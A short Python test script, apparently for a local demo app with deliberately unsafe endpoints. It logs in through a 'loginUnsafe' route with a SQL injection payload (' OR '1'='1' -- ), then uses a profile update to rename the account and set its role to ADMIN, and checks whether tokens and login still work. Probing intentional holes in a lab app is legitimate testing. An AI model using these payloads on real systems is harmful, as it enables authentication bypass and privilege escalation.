import requests

# 1. Reset the DB state for student1 (so we have a baseline)
# I'll just skip this, let's just log in as standard student1 (or whatever we modified it to).
# The default DataInitializer sets student1/123456. Let's restart the app or just test.
# Actually I'll use loginUnsafe to get student1 to avoid guessing current username.
res = requests.post("http://localhost:8090/api/auth/loginUnsafe", json={"username": "' OR '1'='1' -- ", "password": "1"})
token = res.json()["token"]
user_id = res.json()["userId"]
current_username = res.json()["username"]
print(f"Logged in as {current_username}")

put_url = "http://localhost:8090/users/api/users/profile"
put_data = {"username": f"{current_username}_hacked", "role": "ADMIN"}
res2 = requests.put(put_url, json=put_data, headers={"Authorization": f"Bearer {token}"})
print("PUT response:", res2.status_code, res2.text)

# Attempt to fetch with the OLD token (should succeed, since token is just verified cryptographically)
res3 = requests.get("http://localhost:8090/users/me", headers={"Authorization": f"Bearer {token}"})
print("GET with old token:", res3.status_code)

# Attempt to log in with new username and OLD password 123456 over Secure Login!
new_username = f"{current_username}_hacked"
res4 = requests.post("http://localhost:8090/api/auth/loginSecure", json={"username": new_username, "password": "123456"})
print("Secure Login with new username:", res4.status_code, res4.text)

